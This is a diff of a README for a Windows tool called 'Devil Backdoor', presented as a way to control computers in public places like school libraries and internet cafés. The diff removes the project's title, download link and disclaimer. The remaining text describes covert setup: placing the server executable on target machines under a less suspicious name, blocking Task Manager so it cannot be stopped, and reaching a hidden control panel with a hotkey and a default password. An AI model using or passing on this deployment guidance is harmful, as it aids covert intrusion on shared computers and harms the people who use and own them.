@@ -1,5 +1,3 @@
-# ![Devil Logo](https://github.com/Kirlovon/Devil-Backdoor/raw/master/icon.ico) Devil Backdoor 
-
 This is a simple backdoor made to control computers in various public places, like school library, internet café, and so on.
 
 ## Features
@@ -10,8 +8,6 @@ This is a simple backdoor made to control computers in various public places, li
 * **Crazy Mouse** - the cursor will move to a random position!
 * **Block Task Manager** - allows you to block the task manager. This feature can be used to prevent server disconnection.
 
-## How to use it?
-#### [Download](https://github.com/Kirlovon/Devil-Backdoor/releases)
 ### 1. Server setup
 
 First, you need to make sure that all computers are connected to the same shared folder. You must put the **Devil-Server.exe** _(You can rename this file for something less troubling)_ and the **config.ini** _(This file can not be renamed)_ in the same folder, at any place on the hard drive of the computer. 
@@ -35,8 +31,4 @@ Save the config file, and run **Devil-Server.exe** file! If you put **True** in 
 Run **Devil-ControlPanel.exe**.
 If you fill **ControlPanelPatch** option in config file, you can press Hotkey to run Control Panel, _( Default hotkey is **PAUSE** )_ and enter the password specified in the code. _(Default is **QWERTY**)_ <br/>
 Next, in the window that appears, select the shared folder. When the interface appears, in the inputbox type the _ClientID_ to select client, that will receive the command.
-
-***
-###### Devil-Backdoor project is for informational purposes only! You take full responsibility for using this sofware!
-***
 
